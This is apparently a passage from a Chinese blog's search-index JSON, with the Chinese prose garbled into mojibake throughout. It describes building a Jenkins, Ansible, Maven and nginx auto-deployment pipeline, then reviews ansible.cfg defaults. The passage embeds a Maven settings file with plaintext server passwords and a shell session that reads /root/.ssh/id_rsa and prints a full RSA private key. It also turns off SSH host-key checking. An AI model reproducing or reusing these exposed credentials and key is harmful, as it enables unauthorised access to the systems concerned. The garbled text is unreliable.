&lt;!--å½“æ’ä»¶çš„ç»„ç»‡Idï¼ˆgroupIdï¼‰æ²¡æœ‰æ˜¾å¼æä¾›æ—¶ï¼Œä¾›æœå¯»æ’ä»¶ç»„ç»‡Idï¼ˆgroupIdï¼‰çš„åˆ—è¡¨ã€‚è¯¥å…ƒç´ åŒ…å«ä¸€ä¸ªpluginGroupå…ƒç´ åˆ—è¡¨ï¼Œæ¯ä¸ªå­å…ƒç´ åŒ…å«äº†ä¸€ä¸ªç»„ç»‡Idï¼ˆgroupIdï¼‰ã€‚å½“æˆ‘ä»¬ä½¿ç”¨æŸä¸ªæ’ä»¶ï¼Œå¹¶ä¸”æ²¡æœ‰åœ¨å‘½ä»¤è¡Œä¸ºå…¶æä¾›ç»„ç»‡Idï¼ˆgroupIdï¼‰çš„æ—¶å€™ï¼ŒMavenå°±ä¼šä½¿ç”¨è¯¥åˆ—è¡¨ã€‚é»˜è®¤æƒ…å†µä¸‹è¯¥åˆ—è¡¨åŒ…å«äº†org.apache.maven.pluginsã€‚ --&gt; &lt;pluginGroups&gt; &lt;!--pluginçš„ç»„ç»‡Idï¼ˆgroupIdï¼‰ --&gt; &lt;pluginGroup&gt;org.codehaus.mojo&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.apache.tomcat.maven&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.mortbay.jetty&lt;/pluginGroup&gt; &lt;/pluginGroups&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;tomcat&lt;/id&gt; &lt;username&gt;tomcat&lt;/username&gt; &lt;password&gt;keyfree123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;haozhuo&lt;/id&gt; &lt;username&gt;haozhuo&lt;/username&gt; &lt;password&gt;haozhuo123&lt;/password&gt; &lt;/server&gt; &lt;!--d:server çš„id,ç”¨äºåŒ¹é…distributionManagementåº“idï¼Œæ¯”è¾ƒé‡è¦ã€‚ --&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;!--username, password:ç”¨äºç™»é™†æ­¤æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç  --&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;mirrors&gt; &lt;!--è¡¨ç¤ºé•œåƒåº“ï¼ŒæŒ‡å®šåº“çš„é•œåƒï¼Œç”¨äºå¢åŠ å…¶ä»–åº“ --&gt; &lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;hz&lt;/id&gt; &lt;name&gt;hz Central&lt;/name&gt; &lt;url&gt;http://nexus.haozhuo.com:8083/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;CN&lt;/id&gt; &lt;name&gt;OSChina Central&lt;/name&gt; &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;ibiblio.org&lt;/id&gt; &lt;name&gt;ibiblio Mirror of http://repo1.maven.org/maven2/&lt;/name&gt; &lt;url&gt;http://mirrors.ibiblio.org/pub/mirrors/maven2&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;!-- &lt;mirror&gt; &lt;id&gt;jboss-public-repository-group&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;JBoss Public Repository Group&lt;/name&gt; &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; --&gt; &lt;/mirrors&gt; &lt;activeProfiles&gt; &lt;!--make the profile active all the time --&gt; &lt;!--&lt;activeProfile&gt;nexus&lt;/activeProfile&gt; --&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; ä¸‰. é…ç½®nginxåå‘ä»£ç†.åœ¨nginxé…ç½®ç›®å½•/usr/local/nginx/conf/nginx.confï¼Œé…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ 1234567891011121314151617upstream tomcat-jenkins &#123; server 192.168.1.220:8080 weight=1; &#125; server &#123; listen 80; server_name jenkins.yjk.cn; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-jenkins; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; ä¿®æ”¹/etc/hostsï¼Œåœ¨æœ«å°¾æ–°å¢ä¸€è¡Œ : 1127.0.0.1 jenkins.yjk.cn é‡å¯nginxï¼Œ/usr/sbin/nginx -s reloadï¼Œå³å¯ä»¥åœ°å€ jenkins.yjk.cn è®¿é—®Jenkinsä¸»é¡µ. å››. å®‰è£…éƒ¨åˆ†Jenkinsæ’ä»¶è®¿é—®Jenkinsä¸»é¡µï¼šhttp://jenkins.yjk.cnç³»ç»Ÿç®¡ç† â€“&gt; ç®¡ç†æ’ä»¶ â€“&gt; å¯é€‰æ’ä»¶;å®‰è£…æ‰€éœ€è¦çš„æ’ä»¶(æ ¹æ®éœ€è¦è‡ªè¡Œé€‰æ‹©)ï¼Œå¦‚ GitBucket Pluginã€ FindBugs Plug-in ã€Cobertura Plugin ã€ Violations Plugin ã€Email Extension Pluginç­‰ âš ï¸æ’ä»¶å®‰è£…ä¸æˆåŠŸå¤„ç†åŠæ³•ï¼š è¿›å…¥å·¦ä¾§èœå•æ çš„ç³»ç»Ÿç®¡ç†ï¼Œå‘ç°å¾ˆå¤šæ’ä»¶æ— æ³•å®‰è£…æˆåŠŸï¼Œå¦‚ä¸‹å›¾ï¼š å¤åˆ¶å®‰è£…å¤±è´¥çš„åç§°ï¼Œç‚¹å‡»å³ä¾§æŒ‰é’®ï¼Œé€‰æ‹©å¯é€‰æ’ä»¶ï¼Œè¾“å…¥åç§°é‡æ–°å®‰è£…ã€‚ å¦‚æœè¿˜æ˜¯å¤±è´¥ï¼Œè¯·æ³¨æ„æç¤ºä¿¡æ¯ï¼Œå¯ç›´æ¥ä¸‹è½½è¯¥æ’ä»¶æ‰‹åŠ¨ä¸Šä¼ å®‰è£…ï¼Œæ‰‹åŠ¨ä¸‹è½½è¯¥æ’ä»¶ï¼Œåœ¨æ’ä»¶ç®¡ç†çš„é«˜çº§æ ‡ç­¾ä¸­ï¼Œé€‰æ‹©ä¸Šä¼ å®‰è£…ã€‚ å¦‚æœä¸Šä¼ å¤±è´¥ï¼Œè¿˜æœ‰ä¸ªæ–¹æ³•ï¼šç›´æ¥æŠŠä¸‹è½½ä¸‹æ¥çš„æ’ä»¶ä¸Šä¼ åˆ°JenkinsæœåŠ¡å™¨ä¸Šé¢ã€‚é»˜è®¤å®‰è£…çš„è¯ç›®å½•åœ¨ï¼š/root/.jenkins/plugins/ é‡å¯æœåŠ¡å³å¯. äº”. ç³»ç»Ÿè®¾ç½®ä»¥åŠä»‹ç»ï¼ˆå¯è·³è¿‡ï¼‰1.1 ç³»ç»Ÿé…ç½®è¿›å…¥é¦–é¡µç³»ç»Ÿç®¡ç†â€”&gt;ç³»ç»Ÿè®¾ç½®ã€‚ é…ç½®maven é…ç½®é‚®ä»¶æœåŠ¡ ä¸»ç›®å½•é»˜è®¤åœ¨ /root/.jenkins ä¸‹é¢ï¼Œæ­¤ç›®å½•ä¿å­˜jenkins çš„æ‰€æœ‰é…ç½®å’Œæ’ä»¶ç­‰ï¼Œå…·ä½“å¯ä»¥äºæœåŠ¡å™¨ä¸­æŸ¥çœ‹è¯¥ç›®å½•ã€‚ä¸‹é¢å¯ä»¥ç»§ç»­é…ç½®mavenï¼Œjdkï¼Œgitç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„é…ç½®ã€‚ 1.2 é¡¹ç›®é…ç½®æ–°å»ºä¸€ä¸ªè‡ªç”±é£æ ¼çš„é¡¹ç›®ï¼Œè¾“å…¥é¡¹ç›®åç§°ã€‚ 1.å‚æ•°é…ç½® ç®€å•çš„ä»Gitä¸­æ‹‰å–ä»£ç æ— æ³•æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæœ€ç†æƒ³çš„çŠ¶æ€æ˜¯å¯ä»¥å¯¹å‘å¸ƒçš„åˆ†æ”¯è¿›è¡ŒåŠ¨æ€é€‰æ‹©ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸ªé…ç½®åŠ¨æ€å‚æ•°çš„æ’ä»¶ï¼šDynamic Parameter Plug-in å®‰è£…å¥½æ’ä»¶ä¹‹åï¼Œåœ¨é¡¹ç›®é…ç½®ï¼Œå‚æ•°åŒ–æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ åŠ¨æ€å‚æ•°ï¼š è¾“å…¥å˜é‡åç§°å’Œè„šæœ¬ï¼Œåœ¨æ¥ä¸‹æ¥çš„é…ç½®ä¸­å°±å¯ä»¥ä½¿ç”¨$Nameçš„æ–¹å¼ï¼Œä½¿ç”¨å˜é‡äº†ã€‚å¦‚ï¼š$branchã€‚ 12def gettags = (\"git ls-remote -h git@gitlab.ihaozhuo.com:Java_Service/YJK-Java.git\").execute() gettags.text.readLines().collect &#123; it.split()[1].replaceAll('refs/heads/', '') &#125;.unique() è¿™æ˜¯ä¸€æ®µGroovyè„šæœ¬ï¼Œç”¨æ¥è·å–Gitåœ°å€çš„åˆ†æ”¯ï¼Œå°†Gitåœ°å€æ”¹æˆè‡ªå·±çš„å°±è¡Œã€‚ 1.3æ¥ä¸‹æ¥é€‰æ‹©æ‰©å±•åŠŸèƒ½ã€‚ç”±äºæˆ‘ä»¬çš„é¡¹ç›®æ¨¡å—è¾ƒå¤šï¼Œæ‰€æœ‰çš„æœåŠ¡å…¨éƒ¨é‡å¯ä¼šéå¸¸æµªè´¹æ—¶é—´ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¯¹å•ç‹¬çš„æ¨¡å—è¿›è¡Œéƒ¨ç½²ï¼Œè¿™æ—¶å€™éœ€è¦æ·»åŠ ä¸€ä¸ªå¯é€‰æ‹©çš„å‚æ•°Extensible Choice Parameter æ‰©å±•é€‰æ‹©å‚æ•°æ’ä»¶Extensible Choice Parameterçµæ´»ä½¿ç”¨å®ç°éƒ¨ç½²å¤šåº”ç”¨æ¨¡å—æœåŠ¡åŒæ—¶å‘å¸ƒ.å•æ¨¡å—æœåŠ¡å•ç‹¬æ‰“åŒ…å¿«é€Ÿå‘å¸ƒ. å®ç°æ•ˆæœï¼š å‘å¸ƒé€‰æ‹©åº”ç”¨æ¨¡å—ï¼Œä¹‹å‰åªèƒ½å•ä¸ªé€‰æ‹©å‘å¸ƒï¼Œæ•ˆç‡å¤ªä½ï¼Œå®‰è£…choiceæ‰©å±•æ€§çš„æ’ä»¶ï¼Œå¯ä»¥é€‰æ‹©å¤šä¸ªæ¨¡å—åº”ç”¨ä¸€èµ·éƒ¨ç½²ã€‚éå¸¸æ–¹ä¾¿ä¸‹è½½æ’ä»¶ï¼šExtended Choice Parameter Plug-InExtensible Choice Parameter plugin è¿™é‡Œjenkins ç¬¬ä¸€æ­¥å®‰è£…æ‰©å±•æ’ä»¶ï¼š å®‰è£…å¥½æ’ä»¶ä»¥å è¿›å…¥åˆ›å»ºé¡¹ç›®é…ç½®å‚æ•°ï¼š Value ï¼šè¿™é‡Œé€‰æ‹©æ¨¡å—åå­—æœ€å¥½æ˜¯gitæ‹‰å–ä¸‹æ¥çš„åç§°ä¸€æ ·ã€‚è¿™æ ·ä¸‹é¢æ‰“åŒ…å¯ä»¥é€‰æ‹©å¯¹åº”æ¨¡å—åç§°ä¸€æ ·ã€‚ è¿™é‡Œæ„å»ºä½¿ç”¨shell åšä¸€å±‚if åˆ¤æ–­ é€‰æ‹©all å…¨éƒ¨å‘å¸ƒã€‚å’Œå•ç‹¬æ¨¡å—å‘å¸ƒã€‚ 1.4Gité…ç½®åˆæ¬¡ä½¿ç”¨Jenkinséœ€è¦æ·»åŠ ä¸€ä¸ªæœ‰è®¿é—®Gitæƒé™çš„ç”¨æˆ·ã€‚æˆ‘ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ssh-keyï¼Œä¹Ÿå¯ä»¥è‡ªå·±å»ç”Ÿæˆã€‚åœ¨gitlabä¸Šæ·»åŠ ssh-keyå…¬é’¥ è¿™ä¸ªæ˜¯ä½ å‘å¸ƒæœºå™¨çš„å…¬é’¥ã€‚ 1.æºç ç®¡ç†é€‰æ‹©Gitï¼Œè¾“å…¥URLï¼Œå¹¶é€‰æ‹©ç”¨æˆ·ã€‚ ä»Jenkinså‘å¸ƒæœåŠ¡å™¨ä¸Šé¢æŸ¥çœ‹å…¬é’¥ä¸Šä¼ åˆ°gitlab. 2.åœ¨jenkinsä¸Šç‚¹å‡»æ·»åŠ ç§é’¥3.é€‰æ‹©SSHâ€¦keyï¼Œè¾“å…¥ç”¨æˆ·åï¼Œè¾“å…¥ç§é’¥ï¼Œè¾“å…¥å¯†ç ï¼Œæ·»åŠ å®Œæˆã€‚åœ¨Jenkinså‘å¸ƒæœåŠ¡å™¨ä¸Šé¢æŸ¥çœ‹ç§é’¥ï¼š 1234567891011121314151617181920212223242526[root@ansible_02 yaml]# cat /root/.ssh/id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAv5BSNmykQcvklQdb+3jV8d1I2tjq4tIiyVbQDhDBs6UFR4hj20EHg/3Tjvw+4mHtzWFYv1/rYeTg7xJ/bIf3XRIeRcrc/b2rvqo3wQBupRjHM6wbnd+Jgyv2v8Lk2c8yNzMoUIuYzcG5Dpv5mWyg1akbWcIH3tsGyTVXxxmAQ78L+J1Nzj3a9fImQcx5ocKlV/Y1v9B+Uv4gTBmSBR7akvNg7E+3JKTphbbUv3rFrG6zqvTWCtEA/h9X//zPWTiwTjJv87NJkHQLqoo1TPYZcNjDEfki+jfc9gJzJvZ/5D0A3fA/mO8ApW9VMsaLiiwQvGP2RoiTVwU2G1iNASBcWwIDAQABAoIBABh64fawhYEfBDQDP77wHy8MXz4QUFvyDJ38KRRTEd3aLcWJaXFgawx0CHASThrx9sizMvspz9OvwwrqKzx8V6EeKp4yoXEPpv3zlLJmUr1oYDR7PwA6y8Dmgl7ZEhO/haRGNlWssTdCFVsHlasElb0YIjWjNQxGoyRdW71GxfxiGdZXgWDT7yYGvdavO5tGzDPhh6/vf5lpU2F2nJbMyXzWgrrqXqIG3W+jqg2kVAfiMdNgeUOn6+SA/7uK8rNhxG/5dr7WKJE31uRSFJiVCATcHQBIRScDDd/nI8rGiVQOjHFt2oNV82DOIhNXhbzdWGROUcMiT04OoJgQJeNL7IkCgYEA8wrgamw1w5dBoynzV6tUPgSdHhAMoMhPrzJTaG8qMamnHzZgz1fl3jqI7qCNsj1n6Y1UbzhKILHcTIoUj7lj41mY4XVBHqDLXh9Socf9IPrSabZIfe2nwMLMhdhoaMPUWtHj9SUn/Y+ESLuFLtF6LjR1Eghu8xKRwULo1GscSyUCgYEAycbYj1/KaFAcwSl7teRiYEY+LRHB/AUa7lc+r+p2YMjGQ3CiaN9wKqu1E4jEvL0eZXDKaXJ6qcDJiHa2M+Bf8qcVoyXtKFtlTfSVPJDviZjl3EPmhXbuKzW3et2w5zWv8lAU2fWU+3ta3fVrFXz2zlY1j47Dv9zUlDeCF+lRMX8CgYEA1hkKwDU612XzSEy4NM6Uk111GvqAZVKP/4GRwDnNLZqJwhEhDwYbVLyzy6JbsFwvoaoCa0dm5Y5IxpQMsN9bZ9GGH7CWLEJ7a4gJmrYQYpECgYAIqe8WiOhp/jad3KghMUNAGwQEb2TC630yirB4YTrgAP7yWl2+3wkz69eElTTNXdl2RZeLW40EyPBeWaqNI686/g2hybkbKIF7DWtzBE4kvFnyUUAOrwKe/Fl6fxZfdyCs6N9cVH0nJy7JpQYKECmQxobaOSkSjerayl9dx1mI3d6fwqmAbbyiolLXbn3JySkxTaVBS8gjnQh6LO6JbpTspKlz3R2/CzUhDhEYn3vhU2trAGh6hY/bizI1oKNxwp/b9uAaLVmmHGNV/+V5glnDH+luQA==-----END RSA PRIVATE KEY----- æ­¤å¤„è¦æ³¨æ„ï¼Œå°†é»˜è®¤çš„masteråˆ†æ”¯æ”¹ä¸ºæˆ‘ä»¬ä¹‹å‰å®šä¹‰å¥½çš„åˆ†æ”¯å˜é‡. 1.5é¡¹ç›®æ‰“åŒ…ç”±äºæˆ‘ä»¬ä½¿ç”¨æ‰‹åŠ¨å‡ºå‘æ„å»ºï¼Œè§¦å‘å™¨æˆ‘ä»¬æ­¤å¤„ä¸éœ€è¦é…ç½®ã€‚æ„å»ºç¯å¢ƒæš‚æ—¶ä¹Ÿä¸éœ€è¦é…ç½®ï¼Œè¿™é‡Œè°ƒç”¨ansibleå»æ‰§è¡Œymlä»£ç å‘å¸ƒã€‚é¡¹ç›®æ‰“åŒ…ä¼˜åŒ–äº†ã€‚ å…³é”®åœ¨äºæ„å»ºçš„æ­¥éª¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Shellå‘½ä»¤ï¼Œè¿›å…¥é¡¹ç›®ç›®å½•ï¼Œä½¿ç”¨Mavenå‘½ä»¤è¿›è¡Œæ‰“åŒ…ã€‚ è¿™é‡Œä¸»è¦æ˜¯if åˆ¤æ–­æ˜¯ æ‰§è¡Œå¯¹åº”æ¨¡å—æ‰“åŒ…ã€‚è¿™æ ·èŠ‚çœäº†æ‰“åŒ…æ—¶é—´ï¼Œå¦‚æœä¸åšå¯¹åº”å‘å¸ƒæ¨¡å—å‘å¸ƒï¼Œç¬¬ä¸€æ¡å¦‚ä½•modelç­‰äºall æ–‡ä»¶ï¼šå…¨éƒ¨æ‰§è¡Œ : mvn clean install -U -T 1C -Dmaven.test.skip=true å¦‚æœä¸ç­‰äºè¿™é‡ŒæŒ‡å®šå¯¹åº”æ¨¡å—æ‰“åŒ…ï¼š mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true 123456echo $modelif [[ $model == all* ]]; thencd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8elsecd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8fi æ‰€æœ‰çš„è„šæœ¬å’Œå˜é‡çš„å‚æ•°åˆ—è¡¨ç»Ÿä¸€ã€‚ è¿™é‡Œè¯´ä¸‹å‘å¸ƒæ¨¡å— ç»“åˆansible-PlaybookåŸºæœ¬è¯­æ³•å†™æ§åˆ¶å‘å¸ƒæœåŠ¡å™¨ï¼Œç„¶ååœ¨jenkinsä¸Šé¢å†™ansible å‘å¸ƒè„šæœ¬&amp;å‘½ä»¤ã€‚model.sh è„šæœ¬ï¼š 12345678910111213#!/bin/sh IFS=',' arr=$1 for split in $arr do echo $split /usr/bin/ansible-playbook /srv/yaml/$split.yml if [ $split = 'all' ] then echo \"model:all\" break fi done è¿™é‡Œä¸¾ä¸ªä¾‹å­æˆ‘ä¸Šé¢å‘å¸ƒymlæ¨¡å—ä»£ç ã€‚ è¿™ä¸ªè„šæœ¬åšäº†äº”ä»¶äº‹ï¼š1) é¦–å…ˆæŒ‡å®šç¼–ç ä¸ºUTF-8ï¼ˆå¦åˆ™å¯åŠ¨é¡¹ç›®åä¼šä¹±ç ï¼è¿™æ˜¯ä¸ªå‘!ï¼‰2) æ‹·è´æ–‡ä»¶åˆ°æŒ‡å®šæœºå™¨çš„ç›®å½•ä¸‹ï¼Œæ‹·è´å‘½ä»¤çš„destä¸èƒ½ä½¿ç”¨å˜é‡ï¼å¦åˆ™æ‹·è´ä¸ä¼šæˆåŠŸï¼ï¼ˆç¬¬äºŒä¸ªå‘ï¼‰3) é‡å¯è¿œç¨‹æœåŠ¡ï¼Œæˆ‘ä»¬è¯•è¿‡ç›´æ¥é‡å¯tomcatæœåŠ¡ï¼Œè™½ç„¶æœåŠ¡é‡å¯ä¼šæˆåŠŸï¼Œä½†æ˜¯æœ€åä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼Œå¯¼è‡´é¡¹ç›®ç¼–ç æ— æ³•æŒ‡å®šä¸ºUTF-8ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©ä½¿ç”¨Shellè„šæœ¬å»é‡å¯æœåŠ¡ï¼ˆç¬¬ä¸‰ä¸ªå‘ï¼‰ã€‚4ï¼‰ è¿›è¡Œåˆ›å»ºç›®å½•å¤‡ä»½ã€‚5ï¼‰ æŸ¥çœ‹è¿›ç¨‹åå°å¯åŠ¨ã€‚ Ansibleè„šæœ¬ç¼–å†™å®Œä¹‹åï¼Œå¯ä»¥ç°åœ¨è‡ªå·±æœ¬æœºä¸Šæ‰§è¡Œä¸€ä¸‹ã€‚ç›®æ ‡æœºå™¨ä¸Šå¿…é¡»å®‰è£…libselinux-pythonï¼Œä¸ç„¶æ— æ³•æ‰§è¡ŒæˆåŠŸï¼ˆå°å‘ï¼‰ã€‚ åœ¨jenkinsä¸­æˆ‘ä»¬åšå¦‚ä¸‹é…ç½®ï¼šåœ¨æ„å»ºæ‰“åŒ…å‘½ä»¤åé¢æˆ‘ä»¬å¢åŠ ä¸€ä¸ªShellå‘½ä»¤ï¼Œç”¨æ¥æ‰§è¡ŒAnsibleçš„è„šæœ¬ã€‚æˆ‘ä»¬è„šæœ¬åç§°ä½¿ç”¨å˜é‡åç§°ï¼Œè¿™æ ·æˆ‘ä»¬é€‰æ‹©æ¨¡å—å°±èƒ½æ‰§è¡Œå¯¹åº”çš„è„šæœ¬ã€‚ 1.6å‘é€é‚®ä»¶é…ç½®å¥½æ„å»ºå¤±è´¥åå‘é€é‚®ä»¶åˆ°æŒ‡å®šçš„é‚®ç®±ï¼Œå¤šä¸ªé‚®ç®±ç”¨é€—å·éš”å¼€ã€‚ è‡³æ­¤é¡¹ç›®é…ç½®ç»“æŸã€‚ å…­.è¿è¡Œæ•ˆæœï¼Œæ‰“åŒ…æ•ˆæœã€‚æŒ‡å®šæ¨¡å—å»æ‰“åŒ…ï¼Œç»ˆç«¯ä¸ŠæŸ¥çœ‹å‘å¸ƒæ—¥å¿— è¿™é‡Œå˜é‡ç”Ÿæ•ˆæ•ˆæœï¼š ä¸ƒ. Jenkinså»¶ä¼¸å­¦ä¹ æ•ˆæœå›¾ï¼š Blue Ocean æ˜¯Jenkins éå¸¸ä¸é”™ä¸€ä¸ªæå‡ã€‚ è¿™é‡Œå¯ä»¥æŸ¥çœ‹ä¸‹æˆ‘åœ¨æˆ‘githubä¸Šé¢æ‰©å±•æ›´æ–°jenkinsæ–°åŠŸèƒ½Blue Oceanå®ç°å…ˆè¿›çš„å¯è§†åŒ–ç²¾ç¡®å®šä½é—®é¢˜ ç°åœ¨æˆ‘ä»¬Gitä½¿ç”¨çš„æ˜¯ GitLabï¼ŒåŒæ—¶ä¸ºäº†å®‰å…¨æˆ‘ä»¬åšäº†ä¸€å±‚LDAPä»£ç†ï¼Œæ•ˆæœç›¸å½“äºâ€œå°†å†›ä»¤â€ï¼Œæ“ä½œæœºã€Gitå’ŒJenkinsç”¨ OpenLDAP åšç»Ÿä¸€è®¤è¯ï¼Œåç»­ç”¨åˆ°çš„Redmineã€Grafanaã€Zabbix ç­‰éƒ½æ¥å…¥äº†OpenLDAPè®¤è¯ï¼Œæ¯ä¸ªäººéƒ½æœ‰ä¸ªåŠ¨æ€å£ä»¤ï¼Œæ¯æ¬¡éªŒè¯éƒ½éœ€è¦ç”¨åˆ°ã€‚","link":"/2016/09/12/è‡ªåŠ¨åŒ–+Jenkins/Jenkins/ç”¨Ansible + Jenkins+mavenï¼‹nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°/"},{"title":"Ansibleå°ç»“ï¼ˆä¸‰ï¼‰ansible.cfgä¸é»˜è®¤é…ç½®","text":"#Ansibleå°ç»“ï¼ˆå››ï¼‰ansible.cfgä¸é»˜è®¤é…ç½® Ansibleé»˜è®¤å®‰è£…å¥½åæœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶/etc/ansible/ansible.cfgï¼Œè¯¥é…ç½®æ–‡ä»¶ä¸­å®šä¹‰äº†ansibleçš„ä¸»æœºçš„é»˜è®¤é…ç½®éƒ¨åˆ†ï¼Œå¦‚é»˜è®¤æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€æ˜¯å¦å¼€å¯sudoè®¤è¯ã€action_pluginsæ’ä»¶çš„ä½ç½®ã€hostsä¸»æœºç»„çš„ä½ç½®ã€æ˜¯å¦å¼€å¯logåŠŸèƒ½ã€é»˜è®¤ç«¯å£ã€keyæ–‡ä»¶ä½ç½®ç­‰ç­‰ã€‚ å…·ä½“å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233[defaults]# some basic default values...hostfile = /etc/ansible/hosts \\\\æŒ‡å®šé»˜è®¤hostsé…ç½®çš„ä½ç½®# library_path = /usr/share/my_modules/remote_tmp = $HOME/.ansible/tmppattern = *forks = 5poll_interval = 15sudo_user = root \\\\è¿œç¨‹sudoç”¨æˆ·#ask_sudo_pass = True \\\\æ¯æ¬¡æ‰§è¡Œansibleå‘½ä»¤æ˜¯å¦è¯¢é—®sshå¯†ç #ask_pass = True \\\\æ¯æ¬¡æ‰§è¡Œansibleå‘½ä»¤æ—¶æ˜¯å¦è¯¢é—®sudoå¯†ç transport = smartremote_port = 22module_lang = Cgathering = implicithost_key_checking = False \\\\å…³é—­ç¬¬ä¸€æ¬¡ä½¿ç”¨ansibleè¿æ¥å®¢æˆ·ç«¯æ˜¯è¾“å…¥å‘½ä»¤æç¤ºlog_path = /var/log/ansible.log \\\\éœ€è¦æ—¶å¯ä»¥è‡ªè¡Œæ·»åŠ ã€‚chown -R root:root ansible.logsystem_warnings = False \\\\å…³é—­è¿è¡Œansibleæ—¶ç³»ç»Ÿçš„æç¤ºä¿¡æ¯ï¼Œä¸€èˆ¬ä¸ºæç¤ºå‡çº§# set plugin path directories here, separate with colonsaction_plugins = /usr/share/ansible_plugins/action_pluginscallback_plugins = /usr/share/ansible_plugins/callback_pluginsconnection_plugins = /usr/share/ansible_plugins/connection_pluginslookup_plugins = /usr/share/ansible_plugins/lookup_pluginsvars_plugins = /usr/share/ansible_plugins/vars_pluginsfilter_plugins = /usr/share/ansible_plugins/filter_pluginsfact_caching = memory[accelerate]accelerate_port = 5099accelerate_timeout = 30accelerate_connect_timeout = 5.0# The daemon timeout is measured in minutes. This time is measured# from the last activity to the accelerate daemon.accelerate_daemon_timeout = 30 åœ¨ansible.cfgé…ç½®æ–‡ä»¶ä¸­ï¼Œä¹Ÿä¼šæ‰¾åˆ°å¦‚ä¸‹éƒ¨åˆ†ï¼š 12# uncomment this to disable SSH key host checkinghost_key_checking = False é»˜è®¤host_key_checkingéƒ¨åˆ†æ˜¯æ³¨é‡Šçš„ï¼Œé€šè¿‡æ‰¾å¼€è¯¥è¡Œçš„æ³¨é‡Šï¼ŒåŒæ ·ä¹Ÿå¯ä»¥å®ç°è·³è¿‡ ssh é¦–æ¬¡è¿æ¥æç¤ºéªŒè¯éƒ¨åˆ†ã€‚ æˆ‘è¿™é‡Œåšäº†å…ç§˜é’¥çš„æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹ï¼š 12345678910111213141516171819[root@docker ~]# ansible tomcat_C1 -a \"uptime\"192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00[root@docker ~]#[root@docker ~]#[root@docker ~]# cat /var/log/ansible.log2016-09-05 09:19:23,235 p=1412 u=root | ERROR! Missing target hosts2016-09-05 09:19:54,580 p=1417 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:24 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:20:07,206 p=1440 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:37 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:31,607 p=1460 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:01 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:33,800 p=1482 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00 